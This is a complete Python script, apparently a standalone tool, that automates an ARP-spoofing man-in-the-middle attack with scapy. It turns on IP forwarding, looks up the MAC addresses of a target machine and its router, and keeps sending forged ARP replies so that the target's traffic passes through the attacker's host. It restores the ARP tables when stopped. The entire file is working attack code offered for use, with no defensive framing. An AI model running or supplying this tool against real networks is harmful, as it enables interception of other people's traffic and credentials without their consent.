#!/usr/bin/env python3
"""
    arpspoof: Automating a man in the middle attack using ARP spoofing
    Author: Yusef Karim
"""
from os import getuid
import argparse
from scapy.layers.l2 import Ether, ARP
from scapy.sendrecv import srp, send
from time import sleep


def toggle_forwarding(value):
    with open("/proc/sys/net/ipv4/ip_forward", 'w') as fd:
        fd.write(str(value))


def get_mac(target):
    arp_broadcast = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=ARP.who_has, pdst=target)
    answered = srp(arp_broadcast, timeout=1, verbose=False)[0]
    # Return the MAC address of the target machine that responded to our ARP broadcast
    return answered[0][1].hwsrc


def spoof_arp(source_ip, target_mac, target_ip):
    # Send ARP packet with the source MAC address of this machine but a spoofed source IP
    arp_packet = ARP(op=ARP.is_at, psrc=source_ip, hwdst=target_mac, pdst=target_ip)
    send(arp_packet, count=1, verbose=False)


def restore_arp(router_mac, router_ip, target_mac, target_ip):
    # Restore target macine ARP tables
    arp_packet = ARP(op=ARP.is_at, hwsrc=router_mac, psrc=router_ip,
                                   hwdst=target_mac, pdst=target_ip)
    send(arp_packet, count=4, verbose=False)
    print("\n[+] Restored ARP tables for the target machine")
    # Restore router ARP tables
    arp_packet = ARP(op=ARP.is_at, hwsrc=target_mac, psrc=target_ip,
                                   hwdst=router_mac, pdst=router_ip)
    send(arp_packet, count=4, verbose=False)
    print("[+] Restored ARP tables for the router")


def start_spoof(target, router):
    pkt_count = 0
    toggle_forwarding(1)
    print("[+] Enabled ipv4 forwarding on all interfaces")
    target_mac = get_mac(target)
    print("[+] Target at {} has MAC address {}".format(target, target_mac))
    router_mac = get_mac(router)
    print("[+] Router at {} has MAC address {}".format(router, router_mac))
    print("[+] Starting ARP spoof, press ctrl-c to quit")
    try:
        while True:
            spoof_arp(router, target_mac, target)
            spoof_arp(target, router_mac, router)
            pkt_count += 2
            print("\r[+] Current number of packets sent: {}".format(pkt_count), end='')
            sleep(2)
    except KeyboardInterrupt:
        restore_arp(router_mac, router, target_mac, target)
        toggle_forwarding(0)
        print("[+] Disabled ipv4 forwarding on all interfaces")
        print("[+] Goodbye!")


if __name__ == "__main__":
    if(getuid() != 0):
        print("[-] This program must be run as root")
        exit(1)
    else:
        parser = argparse.ArgumentParser(description="ARP Spoofing Automation Tool")
        parser.add_argument("-t", "--target", type=str, required=True,
                            help="IP Address of the target machine")
        parser.add_argument("-r", "--router", type=str, required=True,
                            help="IP Address of the router or L3 switch")
        args = parser.parse_args()
        start_spoof(args.target, args.router)

